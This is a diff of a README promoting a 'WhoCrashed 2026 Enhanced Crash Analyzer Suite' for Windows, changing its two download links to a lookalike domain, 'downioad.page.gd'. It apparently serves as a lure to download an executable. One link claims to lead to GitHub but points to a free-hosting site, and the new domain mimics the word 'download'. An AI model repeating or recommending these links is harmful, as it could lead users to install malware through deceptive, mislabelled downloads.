@@ -2,7 +2,7 @@
 
 WhoCrashed 2026 Enhanced Crash Analyzer Suite is a powerful, standalone Windows desktop application designed to give you deep insights into why your computer has experienced system crashes, freezes, or blue screens. It goes beyond basic reporting by offering a comprehensive analysis of your system's error logs, memory dumps, and driver information to help pinpoint the root cause of instability with clarity.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Latest Version](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## What's Inside: Key Features
 
@@ -45,7 +45,7 @@ A: The core analysis is performed entirely offline on your local machine. An int
 
 Get the latest stable release of the WhoCrashed 2026 Enhanced Crash Analyzer Suite for your Windows PC:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
